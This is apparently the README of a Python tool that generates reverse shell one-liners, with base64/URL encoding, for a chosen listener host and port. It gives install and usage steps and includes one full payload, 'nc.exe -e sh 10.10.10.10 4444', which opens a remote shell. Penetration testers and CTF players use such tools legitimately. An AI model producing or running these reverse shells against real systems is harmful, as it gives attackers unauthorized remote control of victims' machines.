## Requirements
Pyperclip
```bash
  pip3 install pyperclip
```
Psutil
```bash
  pip3 install psutil
```
## Quick usage

#### Clone the repository (or just copy-paste)
```bash
  sudo git clone https://github.com/Gurguii/Reverse-shell-Generator
```  
```bash
    cd Reverse-shell-Generator
```
#### Run the script
```bash
    python3 reverse.py -s <revshell_type> -lh <lhost> -lp* <lport> -enc* <encode_type> -list* <shell_type> --listall*
```  
**Note:** default LPORT is 4444, params with * are optional.    
**Available encodes**: base64(also accepts b64 as input), url  
### Useful info  
**LHOST CAN BE AN IP OR AN INTERFACE OR LOCALHOST(E.g. tun0 or 10.10.10.10)**
- Get a list of all available reverse shells 
```bash
    python3 reverse.py -listall
```  
- Get a list of reverse shells of a given type with the name
```bash
    python3 reverse.py -list bash
``` 
- Straight craft an specific rshell by name  
```bash
    python3 reverse.py -s bash=<name> -lh <lhost>
```
Output:  
 ![image](https://user-images.githubusercontent.com/101645735/178015002-a7ec7467-8b62-4c14-9648-e0c0bf90e019.png)

- Choose a specific reverse shell by name
```bash
    python3 reverse.py -s nc=exe -lh 10.10.10.10
```
This would return => **nc.exe -e sh 10.10.10.10 4444**

## Test 
- Created reverse shell:
```bashi
  hack@hack:~$ python3 reverse.py -s bash=gurgui -lh localhost -lp 9001
```
![If you see this text you are having trouble loading the gif :(](https://media.giphy.com/media/woqDTmU2pL2tc4eJ5c/giphy.gif)  

As you might have noticed, I wrote bash=gurgui, that's because I changed the name of that exact bash rshell to gurgui in the script.  
Having the script in ur path with custom names for shells you usually go for might make this super fast.
